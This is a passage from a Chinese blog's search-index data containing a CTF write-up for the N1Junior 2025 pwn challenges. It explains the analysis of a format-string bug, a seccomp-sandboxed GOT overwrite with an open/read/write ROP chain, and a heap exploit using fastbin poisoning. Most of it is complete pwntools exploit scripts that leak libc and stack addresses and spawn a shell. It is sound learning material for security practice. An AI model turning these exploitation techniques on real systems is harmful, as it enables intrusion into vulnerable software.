ru(b\"0x\") ru(b\"0x\") stack = int(r(12),16) - 0x40 ru(b\"0x\") libc_addr = int(r(12),16) - 0x216600 success(\"stack=0x%x\",stack) success(\"libc_base=0x%x\",libc_addr) stack_ret_addr = stack + 8 pop_rdi_ret = libc_addr + 0x2a3e5 binsh_addr = libc_addr + next(libc.search(b\"/bin/sh\")) system_addr = libc_addr + libc.sym[\"system\"] one = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43] one_addr = libc_addr + one[4] payload2 = fmtstr_payload(6,{stack_ret_addr:one_addr}) # dbg() s(payload2) itr() ","date":"2025-03-12","objectID":"/posts/n1junior2025/:1:0","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#remake"},{"categories":["WP"],"content":"\rwrite_at_will Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ","date":"2025-03-12","objectID":"/posts/n1junior2025/:2:0","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#write_at_will"},{"categories":["WP"],"content":"\r逆向分析程序开了沙箱 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x00000003 if (A != close) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x06 0x00 0x00 0x00000000 return KILL 只允许了exit、read、write、openat、close 要通过 openat、read、write读出flag，这里注意要在当前目录下创建一个flag ","date":"2025-03-12","objectID":"/posts/n1junior2025/:2:1","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#逆向分析"},{"categories":["WP"],"content":"\r思路 程序中没留后门函数，需要libc，先泄露libc 改printf_got为gets，改exit_got为0x40165a，改__stack_chk_fail为ret。这样相当于做ROP 写openat+read+write的ROP链 在call __stack_chk_fail的时候会push下一条指令的地址 from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) exit_got = elf.got['exit'] def arb_write(address,content): p.sendlineafter(b'. Exit\\n',b'1') p.sendafter(b'get?',str(address).encode()) p.send(p32(content)) #泄露libc p.sendlineafter(b'3. Exit\\n',b'2') p.sendafter(b'get?',str(0x404038).encode()) p.recvuntil(b'\\x0a') libc_base = u64(p.recv(6)[-7:].ljust(8,b'\\x00')) - 0x7330237b97d0 + 0x7330236a5000 success(\"libc ---\u003e 0x%x\",libc) gets_addr = libc_base + libc.symbols['gets'] #改printf为gets arb_write(0x404030,gets_addr\u00260xffffffff) #改exit_got arb_write(exit_got,0x40165a) #改stack chk fail 为 ret指令 arb_write(0x404028,0x40101a) openat = libc_base + libc.symbols['openat'] read = libc_base + libc.symbols['read'] write = libc_base + libc.symbols['write'] exit_addr = libc_base + libc.symbols['exit'] pop_rdi_ret = libc_base + 0x000000000002a3e5 pop_rsi_ret = libc_base + 0x000000000002be51 pop_rdx_rcx_rbx_ret = libc_base + 0x0000000000108b03 ret = 0x40101a pl = b'a'*0xa + p64(ret)*8 pl += p64(pop_rdi_ret) + p64(0x404200) + p64(gets_addr) pl += p64(pop_rdi_ret) + p64(0xffffff9c) + p64(pop_rsi_ret) + p64(0x404200) +p64(pop_rdx_rcx_rbx_ret) + p64(0)*3 + p64(openat) pl += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(0x404300) + p64(pop_rdx_rcx_rbx_ret) + p64(0x100)*3 + p64(read) pl += p64(pop_rdi_ret) + p64(1) + p64(write) # dbg() p.sendline(pl) p.sendline(b'/flag\\x00') p.interactive() ","date":"2025-03-12","objectID":"/posts/n1junior2025/:2:2","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#思路"},{"categories":["WP"],"content":"\roldwine","date":"2025-03-12","objectID":"/posts/n1junior2025/:3:0","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#oldwine"},{"categories":["WP"],"content":"\r逆向分析菜单题 add： 根据读入的data_size申请堆块，chunk限制小于等于0x60 并把读入的account、password、堆块地址八字节一写，写0x18一组进0x602040 最后把password根据password的第一个字节对其进行异或加密，还把存储的堆地址的最后一个字节给加密了 delete： free掉堆块，把account、password、堆块地址置0 show： 输入idx，验证password，通过就打印account和data data这里用的是%s，没有\\x00就会一直输出 需要知道的几个点： 把密码的最后一个字节设置成\\x00，就能绕过加密 我们free掉的是加密后的堆地址，可以通过控制加密后的地址，实现邻近地址的任意free（这也是这道题的核心利用点） 我的思路： 泄露libc： 通过libc中的__environ泄露栈地址： 到栈上做ROP： 首先这么构造堆块 data = p64(0)+p64(0x91) add(p64(0x123),p8(0x50),0x10,data) #0 data = p64(0) + p64(0xa1) add(p64(0x123),p64(0),0x50,data) #1 data = b'aaaa' add(p64(0x123),p64(0),0x40,data) #2 add(p64(0x123),p64(0),0x10,data) #3 可以看到经过异或加密，delete(0)的时候，实际上是去delete那个伪造的unsorted bin 接下来，再去把哪个Unsorted bin中的堆块申请出来的时候，其中的libc地址还在那里，泄露出来就行 delete(0,p8(0x50)) #0被free data = b'p'*8 add(p64(0x123),p64(0),0x20,data) #0 show(0,p64(0)) p.recvuntil(b'p'*8) libc_base = u64(p.recv(6).ljust(8,b'\\x00')) - 0x3c4c08 success(\"libc_base -\u003e 0x%x\",libc_base) environ = libc_base + libc.symbols['__environ'] environ_lastbyte = environ \u0026 0xff success(\"environ -\u003e 0x%x\",environ) 接下来，通过伪造fastbin的fd，把堆块申请到bss上 delete(2,p64(0)) #进入fastbin #2被free #覆盖fastbin中堆块的fd pl = p64(0)*3 + p64(0x51) + p64(0x602098) #绕过对fastbin的size的检查 add(p64(0x123),p64(0),0x50,pl) #2 这部分delete(2)之后的堆结构： 然后申请的是0x60的chunk，fastbin没有满足的，unsortedbin中有一个满足，又因为0x70-0x60 \u003c 0x20，如果切割剩下的堆块小于0x20，所以整个都给分配出来，再往fastbin的fd写入bss地址 接着往bss上写入environ去泄露栈地址： add(p64(0x50),p64(0),0x40,data) #4 #泄露栈地址 data = p64(0) + p64(environ) add(p64(0x123),p64(0),0x40,data) #5，0x6020a8 show(4,p64(0)) p.recvuntil(b'[data]: ') stack_addr = u64(p.recv(6).ljust(8,b'\\x00')) success(\"stack_addr -\u003e 0x%x\",stack_addr) 做ROP的环节还是覆盖fastbin的fd，讲一下比较关键的部分： 我们可以执行下面的命令来看看申请fastbin到哪里，怎么申请： 有两个地址可以供我们使用，但是有一个是需要0x70的fastbin，我们最大只能申请0x60的chunk，所以用第二个。把堆申请到这里，再去system(\"/bin/sh\")就可以了 ","date":"2025-03-12","objectID":"/posts/n1junior2025/:3:1","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#逆向分析-1"},{"categories":["WP"],"content":"\rexp 其实感觉还有更简单的方法 from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc ip = \"host.docker.internal\" port = 5555 # p = remote(ip,port) def cmd(idx): p.recvuntil(b'\u003e\u003e ') p.sendline(str(idx).encode()) def add(account,password,size,data): cmd(1) p.sendafter(b'[account]: ',account) p.sendafter(b'[password]: ',password) p.sendafter(b'[data size]: ',str(size)) p.sendafter(b'[data]: ',data) def delete(idx,password): cmd(2) p.sendafter(b'[idx]: ',str(idx).encode()) p.sendafter(b'[verify]: ',password) def show(idx,password): cmd(3) p.sendafter(b'[idx]: ',str(idx).encode()) p.sendafter(b'[verify]: ',password) #泄露libc data = p64(0)+p64(0x91) add(p64(0x123),p8(0x50),0x10,data) #0 data = p64(0) + p64(0xa1) add(p64(0x123),p64(0),0x50,data) #1 data = b'aaaa' add(p64(0x123),p64(0),0x40,data) #2 add(p64(0x123),p64(0),0x10,data) #3 delete(0,p8(0x50)) #0被free data = b'p'*8 add(p64(0x123),p64(0),0x20,data) #0 show(0,p64(0)) p.recvuntil(b'p'*8) libc_base = u64(p.recv(6).ljust(8,b'\\x00')) - 0x3c4c08 success(\"libc_base -\u003e 0x%x\",libc_base) environ = libc_base + libc.symbols['__environ'] environ_lastbyte = environ \u0026 0xff success(\"environ -\u003e 0x%x\",environ) delete(2,p64(0)) #进入fastbin #2被free #覆盖fastbin中堆块的fd pl = p64(0)*3 + p64(0x51) + p64(0x602098) #绕过对fastbin的size的检查 add(p64(0x123),p64(0),0x50,pl) #2 add(p64(0x50),p64(0),0x40,data) #4 #泄露栈地址 data = p64(0) + p64(environ) add(p64(0x123),p64(0),0x40,data) #5，0x6020a8 show(4,p64(0)) p.recvuntil(b'[data]: ') stack_addr = u64(p.recv(6).ljust(8,b'\\x00')) success(\"stack_addr -\u003e 0x%x\",stack_addr) #ROP data = b'aaaa' add(p64(0x123),p64(0x30),0x10,data) #6 pl = p64(0) + p64(0x61) + p64(0) + p64(0x61) add(p64(0x123),p64(0),0x50,pl)#7 #下面这两个堆块用于防止consolidate和对invalid next size (fast)的检测 data = p64(0) + p64(0x51) add(p64(0x123),p64(0),0x10,data)#8 data = p64(0)*2 + p64(0) + p64(0x31) add(p64(0x123),p64(0xe0),0x20,data)#9 delete(9,p64(0xe0)) #可以控制堆块 delete(6,p64(0x30)) #改堆块8的size为0x41,做ROP pl = p64(0) + p64(0x61) + p64(0)*7 + p64(0x41) add(p64(0x123),p64(0),0x50,pl) #6 #接下来free掉堆块8,其size为0x41,进入fast bin add(p64(0x123),p64(0),0x10,data) #9 add(p64(0x123),p64(0),0x10,data) #10 delete(8,p64(0)) #改堆块8的fd为栈地址,让其size为0x40 fake_fast_addr = stack_addr - 0x136 rbp = stack_addr + 0xf8 pl = p64(0)*7 + p64(0x41) + p64(fake_fast_addr) success(\"fake_fast_addr -\u003e 0x%x\",fake_fast_addr) add(p64(0x123),p64(0),0x50,pl)#8 add(p64(0x123),p64(0),0x30,data) #11 system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + next(libc.search(\"/bin/sh\")) pop_rdi_ret = 0x0000000000400df3 pl = b'\\x00'*6 + p64(0) + p64(rbp) pl+=p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) add(p64(0x123),p64(0),0x30,pl) # dbg() p.interactive() ","date":"2025-03-12","objectID":"/posts/n1junior2025/:3:2","series":null,"tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#exp"},{"categories":null,"content":"QQ：Mjg0MDU1MjIxNQ== Email：U2hsb21vSnVuZUBvdXRsb29rLmNvbQ== ","date":"0001-01-01","objectID":"/about/:0:0","series":null,"tags":null,"title":"ABOUT MEEE","uri":"/about/#"}]